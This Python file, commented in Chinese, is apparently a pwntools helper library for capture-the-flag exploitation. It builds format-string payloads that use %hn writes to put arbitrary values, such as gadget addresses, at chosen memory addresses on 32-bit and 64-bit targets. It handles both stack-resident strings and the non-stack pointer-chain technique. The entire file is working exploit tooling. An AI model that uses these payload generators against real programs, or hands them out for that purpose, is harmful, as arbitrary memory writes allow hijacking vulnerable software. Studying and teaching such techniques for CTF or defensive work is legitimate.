from pwn import *

# 将number的低两字节写入到格式化字符串偏移offset的位置, prev_size是已写入的数据大小
# 返回payload和实际写入的大小
def fmt(number, offset, prev_size = 0):
    payload = b''
    write_size = 0          # 实际写入大小
    
    number      &= 0xffff   # 只取低两字节
    prev_size   &= 0xffff   # 只取低两字节
    
    if(number > prev_size): # 如果要写入的值大于已写入的值
        write_size = number - prev_size
    else:
        write_size = number + 0x10000 - prev_size
    
    if write_size == 0:     # 特殊情况
        payload = b'%' + bytes(str(offset), 'utf-8') + b'$hn'
    else:
        payload = b'%' + bytes(str(write_size), 'utf-8') + b'c%' + bytes(str(offset), 'utf-8') + b'$hn'
    
    return payload, write_size

# 64位下的非栈上的格式化字符串漏洞利用
# 设置任意地址的值, target为目标地址, gadget为要写入的值, rsp为栈地址, offset1~3分别是栈上三联的偏移量
# 0x7fffff01 (offset1) -> bss
# 0x7fffff02 (offset2) -> 0x7fffff03 (offset3) -> 0x7fffff04 (offset4)
def fmtnot64(target, gadget, rsp, offset1, offset2, offset3):
    payload = [b'', b'', b'', b'', b'', b'', b'', b'', b'']
    # 设置offset3 -> offset1
    payload[0], _   = fmt(rsp + (offset1 - 6) * 8, offset2)
    for i in [1, 3, 5, 7]:
        # 设置  offset1 -> target
        payload[i], _       = fmt(target + i - 1, offset3)
        # 设置  target  -> gadget
        payload[i + 1], _   = fmt(gadget >> ((i - 1) * 8), offset1)
    return payload

# 64位下的栈上的格式化字符串漏洞利用
# 向target写入gadget, str_offset为字符串的起始位置
def fmtarg64(target, gadget, str_offset):
    payload = b''
    write_size = 0
    for i in range(4):
        value  = ( gadget >> ( i * 16 ) ) & 0xffff
        if(value > write_size & 0xffff):
            num         =   value - ( write_size & 0xffff )
            write_size  +=  value - ( write_size & 0xffff )
        else:
            num         =   value + 0x10000 - ( write_size & 0xffff )
            write_size  +=  value + 0x10000 - ( write_size & 0xffff )
        # 0为特殊情况
        if(num == 0):
            payload += b'%' + bytes(str(str_offset + 7 + i), 'utf-8') + b'$hn'
        else:
            payload += b'%' + bytes(str(num), 'utf-8') + b'c%' + bytes(str(str_offset + 7 + i), 'utf-8') + b'$hn'
    payload  = payload.ljust(56, b'a')
    payload += p64(target)
    payload += p64(target + 2)
    payload += p64(target + 4)
    payload += p64(target + 6)
    return payload

# 32位下的栈上的格式化字符串漏洞利用
# 向target写入gadget, str_offset为字符串的起始位置
def fmtarg32(target, gadget, str_offset):
    payload = b''
    write_size = 0
    for i in range(2):
        value  = ( gadget >> ( i * 16 ) ) & 0xffff
        if(value > write_size & 0xffff):
            num         =   value - ( write_size & 0xffff )
            write_size  +=  value - ( write_size & 0xffff )
        else:
            num         =   value + 0x10000 - ( write_size & 0xffff )
            write_size  +=  value + 0x10000 - ( write_size & 0xffff )
        # 0为特殊情况
        if(num == 0):
            payload += b'%' + bytes(str(str_offset + 7 + i), 'utf-8') + b'$hn'
        else:
            payload += b'%' + bytes(str(num), 'utf-8') + b'c%' + bytes(str(str_offset + 7 + i), 'utf-8') + b'$hn'
    payload  = payload.ljust(28, b'a')
    payload += p32(target)
    payload += p32(target + 2)
    return payload

# 向target写入gadget, str_offset为字符串的起始位置
def fmtarg(target, gadget, str_offset):
    if context.arch == 'i386':
        return fmtarg32(target, gadget, str_offset)
    else:
        return fmtarg64(target, gadget, str_offset)